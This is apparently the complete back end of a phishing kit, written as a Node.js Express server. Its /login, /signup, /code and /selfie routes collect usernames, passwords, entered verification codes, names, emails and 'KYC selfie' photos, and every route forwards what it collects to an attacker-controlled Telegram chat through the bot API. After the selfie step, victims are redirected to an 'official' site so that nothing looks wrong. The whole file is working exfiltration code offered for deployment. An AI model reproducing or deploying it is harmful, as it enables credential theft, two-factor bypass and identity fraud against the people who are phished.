// server.js
const express = require("express");
const bodyParser = require("body-parser");
const fetch = require("node-fetch"); // v2 style
const multer = require("multer");
const path = require("path");
const fs = require("fs");
const FormData = require("form-data");

const app = express();
const upload = multer({ dest: "uploads/" });

// Read secrets from environment (set these in Render)
const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
const TELEGRAM_CHAT_ID = process.env.TELEGRAM_CHAT_ID;
const OFFICIAL_SITE = process.env.OFFICIAL_SITE || "https://your-official-website.com";

// Middleware
app.use(bodyParser.urlencoded({ extended: true }));
app.use(bodyParser.json());
app.use(express.static(path.join(__dirname, "public")));

// Helper: send text to Telegram and wait for response
async function sendTelegramText(text) {
  if (!TELEGRAM_BOT_TOKEN || !TELEGRAM_CHAT_ID) {
    console.log("Telegram config missing - skipping send");
    return { ok: false, error: "telegram_config_missing" };
  }
  try {
    const res = await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ chat_id: TELEGRAM_CHAT_ID, text })
    });
    const data = await res.json();
    return data;
  } catch (err) {
    console.error("sendTelegramText error:", err);
    return { ok: false, error: err.message || "fetch_failed" };
  }
}

// Helper: send photo to Telegram
async function sendTelegramPhoto(filePath, caption = "") {
  if (!TELEGRAM_BOT_TOKEN || !TELEGRAM_CHAT_ID) {
    console.log("Telegram config missing - skipping photo");
    return { ok: false, error: "telegram_config_missing" };
  }
  try {
    const form = new FormData();
    form.append("chat_id", TELEGRAM_CHAT_ID);
    if (caption) form.append("caption", caption);
    form.append("photo", fs.createReadStream(filePath));

    const res = await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendPhoto`, {
      method: "POST",
      body: form,
      headers: form.getHeaders ? form.getHeaders() : {}
    });
    const data = await res.json();
    return data;
  } catch (err) {
    console.error("sendTelegramPhoto error:", err);
    return { ok: false, error: err.message || "photo_send_failed" };
  }
}

/*
  ROUTES:
  - POST /login    -> sends username/password to Telegram, responds {ok:true}
  - POST /signup   -> sends fullname/email to Telegram
  - POST /code     -> sends code to Telegram
  - POST /selfie   -> receives file, sends photo to Telegram, responds {ok:true, redirect: OFFICIAL_SITE}
*/

// Login
app.post("/login", async (req, res) => {
  try {
    const username = (req.body.username || "").trim();
    const password = (req.body.password || "").toString();

    if (!username || !password) {
      return res.json({ ok: false, error: "missing_username_or_password" });
    }

    // mask password a bit for safer display (still visible)
    let masked = password;
    if (password.length > 4) {
      masked = password.slice(0,2) + "*".repeat(Math.max(0, password.length - 4)) + password.slice(-2);
    } else {
      masked = "*".repeat(password.length);
    }

    const message = `🔐 Login Attempt\n👤 Username: ${username}\n🔑 Password: ${masked}`;
    const sent = await sendTelegramText(message);

    if (sent && sent.ok) return res.json({ ok: true });
    return res.json({ ok: false, error: "telegram_send_failed", detail: sent });
  } catch (err) {
    console.error("login error:", err);
    return res.json({ ok: false, error: "server_error" });
  }
});

// Signup
app.post("/signup", async (req, res) => {
  try {
    const fullname = (req.body.fullname || "").trim();
    const email = (req.body.email || "").trim();
    if (!fullname || !email) return res.json({ ok: false, error: "missing_name_or_email" });

    const message = `🆕 New Signup\n👤 Name: ${fullname}\n✉️ Email: ${email}`;
    const sent = await sendTelegramText(message);
    if (sent && sent.ok) return res.json({ ok: true });
    return res.json({ ok: false, error: "telegram_send_failed", detail: sent });
  } catch (err) {
    console.error("signup error:", err);
    return res.json({ ok: false, error: "server_error" });
  }
});

// Code
app.post("/code", async (req, res) => {
  try {
    const code = (req.body.code || "").toString().trim();
    if (!code) return res.json({ ok: false, error: "missing_code" });

    const message = `📟 Code Entered\n🔢 Code: ${code}`;
    const sent = await sendTelegramText(message);
    if (sent && sent.ok) return res.json({ ok: true });
    return res.json({ ok: false, error: "telegram_send_failed", detail: sent });
  } catch (err) {
    console.error("code error:", err);
    return res.json({ ok: false, error: "server_error" });
  }
});

// Selfie (file)
app.post("/selfie", upload.single("selfie"), async (req, res) => {
  try {
    const fullname = (req.body.fullname || "").trim();
    const email = (req.body.email || "").trim();

    if (!req.file) return res.json({ ok: false, error: "no_file_uploaded" });

    let caption = "📸 KYC Selfie";
    if (fullname) caption += `\n👤 ${fullname}`;
    if (email) caption += `\n✉️ ${email}`;

    const filePath = path.join(__dirname, req.file.path);
    const sent = await sendTelegramPhoto(filePath, caption);

    // remove uploaded file
    fs.unlink(filePath, (err) => {
      if (err) console.error("Failed to remove upload:", err);
    });

    if (sent && sent.ok) return res.json({ ok: true, redirect: OFFICIAL_SITE });
    return res.json({ ok: false, error: "telegram_photo_failed", detail: sent });
  } catch (err) {
    console.error("selfie error:", err);
    return res.json({ ok: false, error: "server_error" });
  }
});

// health
app.get("/health", (req, res) => res.json({ ok: true }));

// start
const PORT = process.env.PORT || 3000;
app.listen(PORT, () => console.log(`Server listening on port ${PORT}`));